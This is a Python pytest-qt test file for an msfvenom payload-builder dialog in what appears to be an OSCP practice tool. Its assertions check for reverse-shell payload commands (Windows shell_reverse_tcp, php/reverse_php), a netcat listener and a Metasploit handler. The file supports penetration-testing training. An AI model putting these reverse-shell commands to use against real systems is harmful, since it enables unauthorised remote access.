from __future__ import annotations

from pytestqt.qtbot import QtBot

from oscprecon.gui.dialogs.msfvenom_builder import MsfvenomBuilderDialog


def test_dialog_builds_default_stageless_shell(qtbot: QtBot) -> None:
    dlg = MsfvenomBuilderDialog(lhost="10.10.14.9")
    qtbot.addWidget(dlg)
    cmd = dlg._command.toPlainText()
    assert cmd.startswith("msfvenom -p windows/shell_reverse_tcp")
    assert "LHOST=10.10.14.9" in cmd
    assert dlg._listener.toPlainText() == "nc -lvnp 4444"
    assert dlg._notes.text() == ""  # exam-safe default has no warning


def test_dialog_meterpreter_shows_handler_and_warning(qtbot: QtBot) -> None:
    dlg = MsfvenomBuilderDialog(lhost="10.10.14.9")
    qtbot.addWidget(dlg)
    for i in range(dlg._payload.count()):
        if dlg._payload.itemData(i) == "win-x64-met":
            dlg._payload.setCurrentIndex(i)
    assert "multi/handler" in dlg._listener.toPlainText()
    assert "Metasploit use" in dlg._notes.text()


def test_dialog_platform_switch_repopulates_payloads_and_format(qtbot: QtBot) -> None:
    dlg = MsfvenomBuilderDialog(lhost="10.10.14.9")
    qtbot.addWidget(dlg)
    for i in range(dlg._platform.count()):
        if dlg._platform.itemData(i) == "web":
            dlg._platform.setCurrentIndex(i)
    payload_ids = [dlg._payload.itemData(i) for i in range(dlg._payload.count())]
    assert "php-stageless" in payload_ids
    assert dlg._command.toPlainText().startswith("msfvenom -p php/reverse_php")


def test_panel_button_opens_builder(qtbot: QtBot, tmp_path: object) -> None:
    from oscprecon.gui.widgets.exploit_panel import ExploitPanel

    panel = ExploitPanel("dark")
    qtbot.addWidget(panel)
    # the button exists and is wired; opening the dialog must not raise
    assert panel._payload_btn is not None
    dlg = MsfvenomBuilderDialog(lhost=panel._lhost, parent=panel)
    qtbot.addWidget(dlg)
    assert dlg._command.toPlainText().startswith("msfvenom")
